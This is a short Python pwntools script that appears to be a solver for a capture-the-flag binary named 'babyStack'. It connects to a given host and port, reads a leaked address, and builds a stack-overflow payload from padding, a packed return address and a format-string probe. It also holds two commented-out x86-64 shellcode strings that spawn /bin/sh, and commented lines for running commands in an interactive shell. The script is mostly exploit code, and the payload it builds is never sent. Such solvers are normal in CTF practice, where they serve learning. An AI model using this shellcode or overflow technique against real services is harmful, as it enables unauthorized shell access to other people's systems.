#!/usr/bin/env python
# -*- coding: utf-8 -*-
# python solve.py ip port 0x17f0
from pwn import *
import hashlib
import re


#code = ELF('./babyStack')
#context.arch = code.arch
#context.log_level = 'debug'
#libc = code.libc

if len(sys.argv) > 1:
    r = remote(sys.argv[1], int(sys.argv[2]))
else:
    #r = remote('127.0.0.1', 4444)
    r = process('./babyStack')

#g = lambda x: next(code.search(asm(x, os='linux', arch='amd64')))

line = r.recv(1924)

regex = re.compile("\[(.*)\]")
grps = regex.search(line).groups()

pos = grps[0]
pad = ("A"*8)
pad+= ("B"*8)
posDEC=int(pos,16)
#shell="\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05"
#shell="\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"

GOAL=struct.pack("Q",0x555555555020)
exp =pad+GOAL+("%p %p %p %p")

#r.send("whoami\r\n")
#r.interactive()


#print(line)
